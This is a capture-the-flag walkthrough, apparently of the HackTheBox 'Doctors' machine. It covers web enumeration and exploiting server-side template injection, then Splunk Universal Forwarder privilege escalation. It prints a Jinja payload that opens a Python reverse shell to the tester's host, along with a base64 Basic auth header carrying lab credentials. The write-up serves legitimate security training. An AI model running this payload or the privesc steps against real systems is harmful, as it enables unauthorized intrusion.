Interesting. `8089` port for `Splunkd`. Doing some reasearch I found out that this port is for the [Splunk Universal Forwarder](https://docs.splunk.com/Documentation/Forwarder/8.1.1/Forwarder/Abouttheuniversalforwarder). Let's keep this in mind for later.

Standard enumeration of the site on port `80` doesn't reveal anything great, but there is an interesting thing to note

`doctors.htb`.. let's update our `/etc/hosts` file and point `10.10.10.209` to `doctors.htb`

New things to play with! Let's toss ffuf at this while we poke around

`ffuf -u doctors.htb/FUZZ -w /path/to/wordlist -c`

Let's create an account and see what this app is all about.

Testing different payloads for different exploits gave us nothing in return at first glance. But if we go back and check the `archive` endpoint and check the source we see something interesting..

Ah! Vulnerable to SSTI!


### Access (SSTI, reverse shell)

I actually covered this in a writeup for a CTF Challenge from [Hacktivitycon2020](https://www.tsustyle.com/hacktivitycon2020/) called [Template Shack](https://www.tsustyle.com/hacktivitycon2020/templateshack/). This time, though, instead of using slicing to find where `subprocess.Popen` is, we'll use this handy payload I found on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

After editing it a bit so that it makes a call back to our machine:

```Python
.builtins'import'.popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.36",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh", "-i"]);'").read()
```

We can use that as our `title`, whatever you want for the body and make the post.

Fire up a listener on your box and reload the `archive` tab.


### Privesc (linPEAS, Spelunker)
* Reading/Resources
  * [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  * [Spelunker](https://github.com/tevora-threat/splunk_local_privesc/blob/master/spelunker.sh)

So now we have a shell on the box. Let's see what linPEAS says.

Interesting log file entry

Doesn't look like an email. Maybe the `shaun` user's password? Turns out that it is. Strange.

Let's take a look at port `8089` again. As I mentioned earlier, it's for the [Splunk Universal Forwarder](https://docs.splunk.com/Documentation/Forwarder/8.1.1/Forwarder/Abouttheuniversalforwarder). There's some exploits floating around for it, including a local privilege escalation that we're going to use.

First, we need to update the `Spelunker` script, because the script assumes that the creds are `admin:changeme`.

This is what we need to change:

`Authorization: Basic YWRtaW46Y2hhbmdlbWU=`

to

`Authorization: Basic c2hhdW46R3VpdGFyMTIz`

Get the script on to the box, give it the `x` flag and run it.

Follow the instructions to root!
